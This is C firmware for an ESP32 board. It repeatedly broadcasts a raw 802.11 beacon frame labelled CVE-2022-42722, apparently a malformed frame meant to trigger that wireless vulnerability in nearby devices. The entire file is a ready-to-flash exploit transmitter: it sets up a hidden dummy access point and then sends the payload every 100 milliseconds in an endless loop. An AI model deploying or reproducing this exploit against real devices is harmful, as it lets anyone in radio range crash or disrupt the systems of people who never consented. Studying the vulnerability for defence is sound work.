#include "freertos/FreeRTOS.h"

#include "esp_event_loop.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_wifi.h"

#include "nvs_flash.h"
#include "string.h"

/*
 * This is the (currently unofficial) 802.11 raw frame TX API,
 * defined in esp32-wifi-lib's libnet80211.a/ieee80211_output.o
 *
 * This declaration is all you need for using esp_wifi_80211_tx in your own application.
 */
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

char frame_raw_CVE_2022_42722[] = \
	"\x80\xb4\xca\x92\x01\x00\x00\x00\x00\x01\x20\x00\x00\x00\xb1\xff" \
	"\xff\xff\xff\x00\xff\x00\x00\x00\xc1\xb3\xca\x92\x00\x00\x4c\x4c" \
	"\x4c\x4c\x4c\x4c\x4c\x10\xaa\xff\xd9\x00\x05\x00\xee\xa8\x1f\xd6" \
	"\x7e\xc2\x4f\x10\xc1\x9c";

esp_err_t event_handler(void *ctx, system_event_t *event) {
	return ESP_OK;
}

void spam_task(void *pvParameter) {
	for (;;) {
		vTaskDelay(100 / portTICK_PERIOD_MS);

		esp_wifi_80211_tx(WIFI_IF_AP, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722)-1, false);
	}
}

void app_main(void) {
	nvs_flash_init();
	tcpip_adapter_init();

	wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

	ESP_ERROR_CHECK(esp_event_loop_init(event_handler, NULL));
	ESP_ERROR_CHECK(esp_wifi_init(&cfg));
	ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

	// Init dummy AP to specify a channel and get WiFi hardware into
	// a mode where we can send the actual fake beacon frames.
	ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
	wifi_config_t ap_config = {
		.ap = {
			.ssid = "esp32-beaconspam",
			.ssid_len = 0,
			.password = "dummypassword",
			.channel = 1,
			.authmode = WIFI_AUTH_WPA2_PSK,
			.ssid_hidden = 1,
			.max_connection = 4,
			.beacon_interval = 60000
		}
	};

	ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
	ESP_ERROR_CHECK(esp_wifi_start());
	ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

	xTaskCreate(&spam_task, "spam_task", 2048, NULL, 5, NULL);
}
